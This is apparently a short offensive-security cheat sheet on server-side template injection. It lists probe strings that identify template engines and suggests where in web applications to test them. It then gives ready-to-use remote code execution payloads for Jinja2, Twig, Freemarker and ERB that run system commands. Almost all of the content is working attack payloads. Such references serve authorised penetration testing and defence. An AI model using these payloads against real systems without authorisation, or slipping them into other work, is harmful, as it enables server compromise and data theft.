## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```

